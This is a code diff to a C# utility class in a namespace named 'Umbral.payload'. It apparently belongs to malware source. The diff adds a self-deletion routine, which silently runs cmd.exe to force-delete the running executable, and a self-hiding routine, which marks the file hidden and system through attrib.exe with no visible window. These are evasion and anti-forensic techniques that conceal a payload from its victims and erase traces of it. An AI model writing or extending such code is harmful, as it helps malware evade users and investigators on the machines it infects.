@@ -110,5 +110,32 @@ namespace Umbral.payload.Utilities
                 Environment.Exit(0);
             }
         }
+
+        internal static void DeleteSelf()
+        {
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = $"/c ping localhost && del /F /A h \"{Assembly.GetCallingAssembly().Location}\" && pause";
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+                process.Start();
+            }
+
+            Environment.Exit(0);
+        }
+
+        internal static void HideSelf()
+        {
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "attrib.exe";
+                process.StartInfo.Arguments = $"+h +s \"{Assembly.GetCallingAssembly().Location}\"";
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.Start();
+                process.WaitForExit();
+            }
+        }
     }
 }
